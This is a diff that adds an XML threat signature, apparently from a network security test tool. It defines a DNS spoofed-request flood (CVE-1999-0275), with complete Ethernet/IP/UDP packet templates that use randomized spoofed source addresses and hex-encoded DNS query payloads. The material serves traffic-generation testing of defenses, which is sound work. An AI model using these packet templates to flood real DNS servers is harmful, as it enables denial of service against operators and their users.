@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="DNS Spoofed Request Flood"/>
+    <EngDesc display="true" value="This threat attacks a DNS server by sending multiple DNS requests from spoofed IP addresses. This causes resource starvation of the DNS server.  The domain name that is queried is imperfectnetworks.com."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Flood"/>
+      <item value="Resource_Exhaustion"/>
+      <item value="Crashing"/>
+      <item value="Fragmentation"/>
+    </Intent>
+    <Protocol display="true" value="DNS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="ALL"/>
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Transport_Layer"/>
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Transport_Layer_TCP"/>
+      <item value="Microsoft_Windows_NT_4.0_Service_Pack_1"/>
+      <item value="Microsoft_Windows_NT_4.0_Service_Pack_2"/>
+      <item value="Microsoft_Windows_NT_4.0_Service_Pack_3"/>
+      <item value="ALL"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityspace.com/smysecure/catid.html?viewsrc=1&amp;id=10312"/>
+    <CVEID display="true" value="CVE-1999-0275"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="11471"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464d756a00a900fe009b00c96983a90d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634510859153996133"/>
+    <SigStyle display="false" value="Flood"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="5"/>
+    <Regex display="false" value=""/>
+    <Created value="1315474213" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="DNSdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0043" Identification="@random(0000,FFFF)" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="0000" srcIP="@random(0.0.0.0,255.255.255.255)" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@random(1025,65535)" destPort="$DNSdestPort" checksum="2A4D" length="002F" Payload="00120100000100000000000011696D706572666563746E6574776F726B7303636F6D0000010001"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0043" Identification="@random(0000,FFFF)" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="0000" srcIP="@random(0.0.0.0,255.255.255.255)" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@random(1025,65535)" destPort="$DNSdestPort" checksum="2A4D" length="002F" Payload="00130100000100000000000011696D706572666563746E6574776F726B7303636F6D00001C0001"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
